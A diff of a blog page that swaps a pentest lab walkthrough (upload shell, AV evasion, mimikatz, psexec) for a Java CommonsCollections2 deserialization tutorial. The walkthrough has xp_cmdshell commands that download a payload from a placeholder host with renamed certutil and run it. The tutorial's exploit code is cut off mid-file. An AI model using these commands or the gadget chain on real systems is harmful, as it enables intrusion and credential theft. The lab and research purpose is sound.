@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="和室友艰辛的一次打靶记录, Hexo">
-    <meta name="description" content="和室友艰辛的一次打靶记录之前室友找到了个非常好的靶场，说和我一起打。我们用了四天时间，经历了巨多磨难，总算是让所有机器全部上线（这其中大部分都是我室友打下来的，我有点像个混子一样。。。），由于大部分是舍友打下来的，所以这里我从头到尾复现一下">
+    <meta name="keywords" content="java反序列化CommonCollections2, Hexo">
+    <meta name="description" content="java反序列化CommonCollections2不同于之前的几条利用链的是，CommonCollections2要在Common-Collections4下才能生效。Common-Collections4和之前用到的Common-Col">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +19,7 @@
 
     
 
-    <title>和室友艰辛的一次打靶记录 | Hexo</title>
+    <title>java反序列化CommonCollections2 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">和室友艰辛的一次打靶记录</h1>
+                    <h1 class="description center-align post-title">java反序列化CommonCollections2</h1>
                 </div>
             </div>
         </div>
@@ -438,8 +438,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
+                            <a href="/categories/JAVA/" class="post-category">
+                                JAVA
                             </a>
                         
                     </div>
@@ -451,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-02-26
+                    2022-02-18
                 </div>
                 
 
@@ -472,83 +472,50 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="和室友艰辛的一次打靶记录"><a href="#和室友艰辛的一次打靶记录" class="headerlink" title="和室友艰辛的一次打靶记录"></a>和室友艰辛的一次打靶记录</h1><p>之前室友找到了个非常好的靶场，说和我一起打。我们用了四天时间，经历了巨多磨难，总算是让所有机器全部上线（这其中大部分都是我室友打下来的，我有点像个混子一样。。。），由于大部分是舍友打下来的，所以这里我从头到尾复现一下，也顺便把踩过的坑记录一下。</p>
-<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>所有机子都是搭在舍友的电脑上的vmware上的。他用一个内网穿透把web1的入口映射到了他的服务器上。这里直接访问他给的网站即可。</p>
-<p><img src="/Downloads/20220330161905.png" alt="20220330161905"></p>
-<p>是个cms，这个页面上的登陆和注册就是俩摆设，没啥用。所以这边直接dirsearch扫描</p>
-<p><img src="/Downloads/20220330143737.png" alt="20220330143737"></p>
-<p>这里看到了一个admin&#x2F;login.aspx。直接访问，会弹出来一个后台管理登陆注册界面，而且admin显示已经让注册过了。手动sql注入一番失败后，我直接自己注册了一个管理员登陆了上去。</p>
-<p><img src="/Downloads/20220330161828.png" alt="20220330161828"></p>
-<p>然后就有了现在这个界面。到了这里舍友一眼就看中了百度Ueditor,而我把目光放在了模版上面（嗯。。。最后shell是舍友的方法拿下的。。。）模版这块由于原来的模版只有html、css和js文件，所以无法直接写马。添加模版需要admin账户的权限。所以这里用sqlmap尝试注入，虽然能注，但速度很慢。这时候舍友在网上找到了源码，这种cms的数据库信息一般都是写死在源码中的，所以我们能通过源码拿到数据库表名字段名等一些信息。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912"></p>
-<p>在这个配置文件中找到了数据库文件HdhCms.mdb。用office打开</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660"></p>
-<p>找到了数据库中含有admin用户的表名和对应的字段名。然后sqlmap跑出了结果。有了admin用户，我们就可以增加配置文件了。然而配置文件有白名单过滤。基本所有方法都试了也不行。与此同时舍友用打Ueditor的方法拿下了web1。</p>
-<p>在服务器上上传一个html文件：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+                <h1 id="java反序列化CommonCollections2"><a href="#java反序列化CommonCollections2" class="headerlink" title="java反序列化CommonCollections2"></a>java反序列化CommonCollections2</h1><p>不同于之前的几条利用链的是，CommonCollections2要在Common-Collections4下才能生效。Common-Collections4和之前用到的Common-Collections3.2.1并不冲突，可以存在于同一个项目中。</p>
+<h2 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h2><p>CommonCollections中找利用链的思想是<strong>找一条从被序列化类的readObject方法中找出能调用transform方法的调用链</strong>。而在CommonCollections2中，我们用的这个被序列化的类是java.util.PriorityQueue。我们先来看一下这个类的readObject方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">       s.readInt();</span><br><span class="line"></span><br><span class="line">       SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">       queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in all elements.</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">           queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">       <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">       heapify();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
-<p>浏览器访问会有这样的界面</p>
-<p>![截屏2022-03-30 下午5.26.10](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午5.26.10.png)</p>
-<p>然后在服务器上上传一张图片马，其实直接把写好的aspx木马后缀改为.jpg就行了（这里只让传图片）。然后把图片路径写入文本框中上传。</p>
-<p><img src="/Downloads/20220330151830.png" alt="20220330151830"></p>
-<p>看到这里就代表上传成功了，直接蚁剑连就行了。</p>
-<p>但这里注意一下我们服务器上的文件是ice.jpg,而我们上传的文件名为ice.jpg?.aspx,这里用到了一个解析漏洞，web1来我们服务器上取文件时，并不能解析?及后面的内容，所以它取走的是ice.jpg,但在web的IIS服务器上存放时却解析了后面的aspx。</p>
-<p><img src="/Downloads/20220330152505.png" alt="20220330152505"></p>
-<p>接下来要想办法让web1上线msf或CS，这里我们传上去的可执行文件都让杀软给杀了。我弄了很多的免杀也没有逃掉360和火绒的法眼。但我舍友用msf生成了编码后的aspx文件绕过了杀软的检测，后来我试了一下，貌似aspx文件不用编码也不会被杀。</p>
-<p>生成aspx把流量反弹到服务器的1234端口，再使用frp，把服务器上1234端口的流量转发到kali的4444端口。</p>
-<p><img src="/Downloads/20220330154903.png" alt="20220330154903"></p>
-<p>这里看到web1上线msf了。</p>
-<h2 id="DATA1"><a href="#DATA1" class="headerlink" title="DATA1"></a>DATA1</h2><p>到了这个时候要按道理是要扫描的。但是在蚁剑中我们找到了它的HdhApp.config。</p>
-<p>![截屏2022-03-30 下午7.31.07](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午7.31.07.png)</p>
-<p>在这里我们可以很清楚的看到数据库账户密码以及数据库服务器的ip。我舍友从网上找了一个能连接数据库的aspx大马。</p>
-<p><img src="/Downloads/20220330195325.png" alt="20220330195325"></p>
-<p>我们可以直接成功连接，这里使用tasklist &#x2F;SVC命令，导出的结果可以直接拿去在线杀软识别工具识别杀软。</p>
-<p><img src="/Downloads/20220330195342.png" alt="20220330195342"></p>
-<p>结果发现data1这台机子并没有360，只有火绒。于是有了这样一个思路，之前所有传上去的面杀，有360杀掉的，也有火绒杀掉的，那么这次我们只要传上去之前试过的360杀掉的而火绒杀不掉的木马应该就可以了。所以在我的要求下，我们看了web1中杀软被杀的具体情况。 </p>
-<p>嗯。。。大概看了一下，感觉都是360杀的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC"></p>
-<p>但我细心的舍友发现这里有两种情况，一种是木马上传后立即被杀掉，就和第一张图一样。而在第二张图中，当时我传上去了一个加载器和一个二进制文件，这两个是肯定不会被杀软杀掉的。但是我用加载器把二进制文件加载成可执行文件并注入内存时系统报了错，360这里检测到了这个行为并阻止了。</p>
-<p>那么在没有360的data2中，我们用加载器的方法应该就没问题了。</p>
-<p>这里需要把加载器和CS生成的二进制文件传到data2中。这里我们用certutil从远程服务器上下载。但是失败了，原因大概是火绒对本地certutil有限制。所以这里我们选择把certutil从System32下移位并重命名绕过检测。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为cerice.exe：</span><br><span class="line">declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\cerice.exe&#x27;;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your_ip:20022/HanzoInjection.exe&quot; C:\Users\MSSQLSERVER\hanzo.exe&#x27;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your ip/payload.bin&quot; C:\Users\MSSQLSERVER\payload.bin&#x27;</span><br><span class="line"></span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;cd C:\Users\MSSQLSERVER\ &amp;&amp; hanzo.exe -e payload.bin&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>似乎没有可以让我们直接使用的transform。这里我们先直接给出最后调用到transform的地方，位于org.apache.commons.collections4.comparators.TransformingComparator的compare方法中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">       <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">       <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
-<p>CS成功上线</p>
-<p><img src="/Downloads/20220330212038.png" alt="20220330212038"></p>
-<p>然后我们看一下网卡信息</p>
-<p><img src="/Downloads/20220330213444.png" alt="20220330213444"></p>
-<p>紧接着用CS自带的扫描器对22网段做个扫描</p>
-<p><img src="/Downloads/20220330213411.png" alt="20220330213411"></p>
-<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>那么该网段剩下的就还有192.168.22.149这台机子没有拿到了。在这次扫描中，发现149的80端口是开着的，于是我们挂上CS的代理直接访问。</p>
-<p>![截屏2022-03-30 下午11.56.19](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午11.56.19.png)</p>
-<p>![截屏2022-03-30 下午10.07.03](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午10.07.03.png)</p>
-<p>我们成功得到一个登陆界面，并且在用他给的用户名密码登录后抓到了一个jwt，于是到这里我满怀欣喜的去爆破了。最后也的确爆破出了结果</p>
-<p>![截屏2022-03-28 上午10.00.29](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-28 上午10.00.29.png)</p>
-<p>然而就在这个时候，我的舍友发现了些了不起的东西。他通过目录扫描找到了一个名为a.php的文件，我们访问这个文件</p>
-<p>前面是一些sql的日志信息，后面跟了个phpinfo。</p>
-<p>![截屏2022-03-31 上午12.01.59](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.01.59.png)</p>
-<p>但最后这个东西就让人有点不淡定了，这貌似就是一个一句话木马没参数报的错。这里我们直接给蚁剑挂代理打。</p>
-<p>![截屏2022-03-30 下午10.24.07](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午10.24.07.png)</p>
-<p>然后居然真成功了。直接上线CS，这里以data1为跳板再起一个监听器</p>
-<p><img src="/Downloads/20220330224350.png" alt="20220330224350"></p>
-<p>然后生成一个可执行文件上传到web2中运行</p>
-<p><img src="/Downloads/20220330224438.png" alt="20220330224438"></p>
-<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><p>其实到了这里我们已经打进域内了</p>
-<p>![截屏2022-03-31 上午12.16.21](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.16.21.png)</p>
-<p>后面就是我最喜欢的环节了，直接mimi抓密码。嗯。。。抓了个寂寞，明文一个没抓到不说，连个管理员的hash都没有，即没法ipc远程连接，也没法hash传递。一怒之下，我看都没看直接导出了所有票据。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+<p>那么它们是怎样连接起来的呢？这里我们就要聊一下PriorityQueue了</p>
+<p>java.util.PriorityQueue是一个基于二叉堆实现的优先队列。二叉堆是一种特殊的堆，二叉堆是完全二叉树或者是近似完全二叉树。二叉堆有两种：最大堆和最小堆。<strong>最大堆：父结点的键值总是大于或等于任何一个子节点的键值；最小堆：父结点的键值总是小于或等于任何一个子节点的键值。</strong>这样就使得每个元素都有了自己的优先级。</p>
+<p>那么反序列化时为什么要调用一个heapify()方法，这个方法又是干什么的呢？                                                                                                          heapify方法对数组进行调整，使得它符合二叉堆的规范或者特点。而在readObject中调用它就是为了在反序列化之后能保证整个结构的顺序。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Downloads/20220330225238.png" alt="20220330225238"></p>
-<p>还真不少，由于这里的票据是TGS返回的票据，里面包含服务ntlm加密的session_key值，所以我们只要找到服务是域控的，抓到的就可能是域管的hash了。这里有不少，我们随便抓一个下来爆破。</p>
-<p><img src="/Downloads/20220328233414.png" alt="20220328233414"></p>
-<p>这里爆破出了一个明文密码。就像之前说的一样，由于我选取的票据服务端是域控，所以盲猜这个就是域管的密码。</p>
-<p>那么就用一下psexec试试吧,首先建立一个smb监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\16SEREVR-DC1\ipc$ &quot;P@55w0rd!&quot; /user:&quot;Administrator&quot;   </span><br><span class="line">jump psexec 16SEREVR-DC1 smb   //smb是我们之前建立的监听器的名字</span><br></pre></td></tr></table></figure>
+<p>这里只调用了一个方法，siftDown(),这个方法的作用是将结点下移（排序是靠将大的节点下移实现的）。而这个方法又会调用一个siftDownUsingComparator方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">           <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">           <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">               comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">               c = queue[child = right];</span><br><span class="line">           <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           queue[k] = c;</span><br><span class="line">           k = child;</span><br><span class="line">       &#125;</span><br><span class="line">       queue[k] = x;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后就成功了（这里截图丢了，环境也不好重开，见谅。。。）。</p>
-<h2 id="DATA2"><a href="#DATA2" class="headerlink" title="DATA2"></a>DATA2</h2><p>域控都到手了我还怕个DATA2？我一开始是这么想的，但是事实证明我错了，我用打域控的方法打了一下DATA2，虽然ipc连接能够成功建立，但是psexec却不能成功执行。后来耽误了很长时间，我舍友用CS自带的psexec给拿下了，我看了一下，CS自带的psexec和我之前的打法的确不同，我是先建立ipc连接，然后上传psexec并运行，而它是先制作了个管理员的令牌并注入内存后再上传psexec并运行的，说实话到现在我也不知道为啥效果会不一样，等以后研究明白后我会把这段补上的。。。</p>
-<p>纪念一下：</p>
-<p><img src="/Downloads/Cache_d7190aefe1187f6.jpg" alt="Cache_d7190aefe1187f6"></p>
+<p>在这个方法中是实现了排序的代码。这里的comparator.compare就是来比较两个节点大小的。</p>
+<p>说到这里，我们就不得不提一下比较器了。比较器涉及了一种java设计模式——<strong>Strategy设计模式</strong>（策略设计模式），这里我们不展开说。对于比较器而言，其实就是把不同比较策略的算法封装到实现了Comparator接口的类当中。客户在调用的时候可以根据自己的需求选择。</p>
+<p>这里我们看一下这个比较器是哪来的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">        <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在PriorityQueue的构造函数中我们可以看到这个comparator是调用者传进去的。其实PriorityQueue有很多个构造函数，我这里贴出这个构造函数是因为待会我们要使用的就是这个。</p>
+<p>现在我们再回看之前给出的org.apache.commons.collections4.comparators.TransformingComparator，其实它就是一个实现了Comparator的类，是不是有种恍然大明白的感觉。这里我们只需把它传入PriorityQueue的构造函数中。不就能通过其compare方法顺利调用了transform吗？</p>
+<p>下面我们给出POC：</p>
+<p>Transformer这块还是和CommomCollections1一样，这里我们需要把transformerchain传入到TransformingComparator中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>然后就是实例化PriorityQueue，这里我们用到的是上面提到的那个构造函数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们这里传入了两个参数，第二个是触发漏洞的comparator，那么第一个参数又是什么呢？我们观察之前的构造函数可以看到，第一个参数其实是创建初始数组的长度。我们这里传入2，是因为只有在元素个数大于等于2的时候才会触发比较。后面随意添加两个非null的对象进去即可。其实我们传入的这两个对象最后会被当作参数传入compare方法，随后传入到我们要触发的transform中。</p>
+<p>![截屏2022-02-24 下午4.18.19](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-02-24 下午4.18.19.png)</p>
+<p>那么这样会不会影响到我们POC链的执行呢？我们回顾一下之前的内容：这里的transformer是我们传进去的transformerChain，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里又会把这个参数传入到第一个Transformer的transform方法中，即ConstantTransformer的transformer，我们看一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入的参数在这里并不会有任何的影响。</p>
+<p>最后的POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 